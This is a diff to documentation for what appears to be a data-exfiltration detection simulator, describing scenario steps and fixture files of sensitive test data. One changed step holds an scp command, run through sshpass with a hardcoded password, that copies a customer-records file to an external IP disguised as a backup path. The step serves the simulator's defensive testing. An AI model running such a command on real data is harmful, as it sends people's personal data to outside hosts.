@@ -131,7 +131,7 @@ Each step in `simulation_steps`:
 {
   "order": 1,
   "role": "cli",
-  "command": "scp /home/user/fixtures/customer_records.csv user@203.0.113.50:/tmp/exfil/",
+  "command": "sshpass -p 'Kx9mP2q' scp /home/user/fixtures/customer_records.csv admin@203.0.113.50:/var/backups/",
   "description": "SCP customer data to external server",
   "expected_artifact": "scp_connection_to_external_ip",
   "timeout_seconds": 30
@@ -154,7 +154,7 @@ For UI steps, use `"role": "ui"` and add `"ui_instructions"` with plain English:
 
 The `data/fixtures/` directory contains 15 realistic test files that scenarios reference:
 
-- `customer_records.csv` -- 50 rows of fake PII (names, emails, SSNs, balances)
+- `customer_records.csv` -- 10 rows of realistic PII (names, emails, SSNs, credit cards)
 - `proprietary_code.py` -- sample proprietary source code
 - `q3_revenue.csv` -- internal financial data
 - `salary_table.csv` -- employee compensation data
